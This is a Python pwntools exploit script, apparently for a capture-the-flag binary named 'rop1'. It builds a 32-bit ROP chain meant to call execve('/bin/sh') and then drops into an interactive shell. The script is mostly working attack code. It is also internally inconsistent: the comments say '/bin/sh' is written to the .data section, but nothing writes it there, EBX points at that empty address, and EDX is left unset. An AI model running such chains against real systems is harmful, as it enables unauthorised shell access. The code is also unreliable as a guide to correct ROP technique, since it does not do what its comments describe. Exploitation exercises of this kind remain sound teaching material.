#!/usr/bin/env python3
from pwn import *

context.arch = 'i386'
context.log_level = 'debug'

# Memory addresses
DATA_ADDR = 0x0804c010  # .data section

# ROP gadgets
POP_EAX = 0x0804919a
POP_EBX = 0x0804901e
POP_ECX = 0x080491a4
INT_80  = 0x080491b4

def build_rop_chain():
    # Initial padding
    rop = b"A" * 28    

    # Write "/bin/sh" to data section first
    binsh_str = b"/bin/sh\x00"
    
    # Set up execve("/bin/sh", 0, 0) syscall
    rop += p32(POP_EAX)
    rop += p32(0xb)            # execve syscall number
    
    rop += p32(POP_EBX)
    rop += p32(DATA_ADDR)      # pointer to "/bin/sh"
    
    rop += p32(POP_ECX)
    rop += p32(0)              # argv = NULL
    
    rop += p32(INT_80)         # Execute syscall
    
    # Append /bin/sh string after ROP chain
    rop += binsh_str

    return rop

def main():
    # Start process
    p = process('./rop1')
    
    # Send payload
    payload = build_rop_chain()
    print(f"Payload length: {len(payload)}")
    p.sendline(payload)
    
    # Go interactive
    p.interactive()

if __name__ == "__main__":
    main()
